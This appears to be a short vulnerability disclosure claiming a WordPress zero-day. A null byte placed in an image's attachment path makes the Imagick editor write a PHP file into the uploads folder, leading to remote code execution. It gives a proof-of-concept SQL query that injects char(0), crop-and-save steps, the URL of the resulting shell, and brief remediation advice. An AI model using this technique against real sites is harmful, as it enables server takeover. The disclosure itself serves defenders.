# WordPress null byte to RCE - 0 day bug

It is common knowledge that non binary safe functions in PHP should be avoided e.g. to be replaced from legacy code with binary safe alternatives.

What we have in the WP core `class-wp-image-editor-imagick`

```
$this->make_image( $filename, array( $image, 'writeImage' ), array( $filename ) );
```

and we all know that PHP imagick prefers `writeImageFile` before `writeImage` because it is binary safe. What does this mean?
This means if WP uses `class-wp-image-editor-imagick` as default image editing engine we can salute our RCE because we are null byte away from it when `save` e.g. `_save` method is called.

## Eli5 PoC

- upload media file to your local WP called "nullbyte.jpg"
- get its post id ( mine is 91 )
- open mysql administration tool and issue following query:

```
UPDATE `wp_postmeta` SET `meta_value` = concat('2020/07/nullbyte.jpg#','/go.php',char(0),'.gif' ) WHERE `wp_postmeta`.`post_id` = 91 and `wp_postmeta`.`meta_key` = '_wp_attached_file'
```

- go to media library, crop image + save
- navigate to https://wp.local/wp-content/uploads/2020/07/nullbyte.jpg%23/go.php

## Few facts
- Images manipulated with PHP Imagick will hold their old meta data (php shells / code will remain intact)
- WP core had put a lot of efforts to protect `_wp_attached_file` meta value, but it is bypassable (next days disclosure)
- WP in 5.5 via its site-health will warn users that they need to use ImageMagic on their servers :/
- WP core via its site-health push users to install/configure WP in that way so core files are writable by web server
- have you ever heard about https://github.com/Slavco/wp-weaver :)
- there are few another attack vectors than described above

## remediation
- uploads dir shouldn't be able to run PHP code
- core files shouldn't be writable by www-data user
